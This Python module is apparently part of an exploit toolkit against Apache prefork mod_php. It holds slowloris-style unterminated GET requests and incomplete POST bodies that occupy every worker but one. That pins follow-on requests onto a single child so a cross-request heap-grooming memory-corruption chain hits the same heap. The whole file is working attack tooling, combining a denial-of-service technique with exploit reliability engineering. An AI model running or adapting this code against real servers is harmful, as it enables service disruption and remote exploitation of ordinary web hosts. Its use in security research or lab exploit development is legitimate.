#!/usr/bin/env python3
# INDEX: pin prefork pool onto one child | apache | multi-worker prefork pool
"""Prefork worker-connection pinning via keepalive/slowloris sockets.

Collapses a multi-worker prefork mod_php pool onto a single free child so a
cross-request groom (one request OOMs a dangling slot, the next reclaims it, a
third reads it) stays on one heap. WorkerPin is the probe-confirmed slowloris
variant (release exactly one child); hold_workers is the fallback
incomplete-POST pin. Pure stdlib (socket, time); python3 -I safe.
"""
import socket
import time


class WorkerPin:
    """Client-side slowloris worker-pinning for prefork mod_php - forces a
    cross-request groom (A OOMs a dangling slot, B reclaims it, the alive-check
    reads it) onto ONE child. A multi-worker pool scatters A/B/alive across
    children with independent heaps + ASLR, so the groom silently misses; pinning
    collapses the pool to a single free worker. Version/offset-independent, pure
    stdlib sockets (socket, time); it re-pins per attempt over sockets, so held
    sockets are never torn down under it.

    Mechanism (from the Marven11 corpus PoC): pin() opens one UNTERMINATED
    request per worker (classic slowloris - the child accepts and blocks waiting
    for the rest of the headers); probe_saturated() confirms every child is
    blocked; release_one() frees exactly one child, onto which every follow-on
    `Connection: close` request then lands. Re-pin before each attempt and
    release() after (or use it as a context manager)."""

    def __init__(self, host, port, workers):
        self.host = host
        self.port = port
        self.workers = workers
        self.held = []

    def pin(self):
        """Open one slowloris holder per worker - each sends headers with NO
        terminating CRLFCRLF, so the child blocks reading the rest. Stops on the
        first OSError (pool/backlog full). Returns the holder count held."""
        self.release()
        lead = (b"GET / HTTP/1.1\r\nHost: " + self.host.encode() +
                b"\r\nX-Pad: " + b"A" * 64)  # deliberately UNTERMINATED
        for _ in range(self.workers):
            try:
                s = socket.create_connection((self.host, self.port), timeout=5)
                s.sendall(lead)
                self.held.append(s)
            except OSError:
                break
            time.sleep(0.01)
        return len(self.held)

    def probe_saturated(self, timeout=3):
        """Open a FRESH connection and send a COMPLETE request; a timeout OR a
        0-byte read means every child is blocked (saturated). False when no
        holders were opened (nothing to pin against)."""
        if not self.held:
            return False
        try:
            s = socket.create_connection((self.host, self.port), timeout=timeout)
            s.settimeout(timeout)
            try:
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + self.host.encode() +
                          b"\r\nConnection: close\r\n\r\n")
                return not s.recv(64)  # 0-byte read == saturated
            except (socket.timeout, TimeoutError):
                return True
            finally:
                s.close()
        except OSError:
            return True

    def release_one(self, settle=0.25):
        """Close exactly one blocked holder so one child returns to the pool,
        then sleep `settle` so Apache reaps it before the groom runs."""
        if not self.held:
            return False
        try:
            self.held.pop().close()
        except OSError:
            pass
        time.sleep(settle)
        return True

    def release(self):
        """Close every held holder (after each attempt / on exit)."""
        for s in self.held:
            try:
                s.close()
            except OSError:
                pass
        self.held.clear()

    def pin_one_free(self):
        """pin() + probe_saturated() + release_one() for one attempt: leaves the
        pool saturated except one free child. Returns True on success; on a pool
        that never saturated (more workers than --pin-workers, or none opened) it
        releases everything and returns False."""
        held = self.pin()
        sat = self.probe_saturated()
        if not sat:
            self.release()
            return False
        self.release_one()
        return True

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.release()
        return False


def hold_workers(host, port, workers):
    """Occupy workers-1 prefork children with incomplete POST bodies so every
    chain request lands on the same remaining child (the cross-request dangling
    pointers need one worker). Returns the held sockets (close them at the end).

    Fallback pin (used when --pin-workers is 0); the slowloris WorkerPin above is
    the probe-confirmed, release-exactly-one variant wired in under --pin-workers.

    `workers` MUST match the target's real MaxRequestWorkers: stock
    mod_reqtimeout gives each holder ~10s before rejecting it, so against a
    smaller pool the surplus holders queue and drain serially ahead of the real
    request (workers=150 on a 1-worker pool stalls ~25min/shot, looking like a
    timing miss, not a flag mistake). Pass `workers=1` for single-worker labs."""
    holders = []
    if workers <= 1:
        return holders
    for i in range(workers - 1):
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: " + host.encode() +
                      b"\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                      b"Content-Length: 1048576\r\n\r\nx")
            holders.append(s)
        except OSError as e:
            print(f"[worker_pin]   holder {i + 1}/{workers - 1} failed: {e!r}")
            break
        time.sleep(0.01)
    time.sleep(0.8)
    print(f"[worker_pin] pinned {len(holders) + 1}/{workers} workers "
          f"({len(holders)} holders)")
    return holders


def close_holders(holders):
    """Close every socket in `holders` and clear the list in place - the
    shutdown half of hold_workers()'s lifecycle (a container restart kills the
    held sockets too, so callers re-open via hold_workers() after each one)."""
    for s in holders:
        try:
            s.close()
        except OSError:
            pass
    holders.clear()
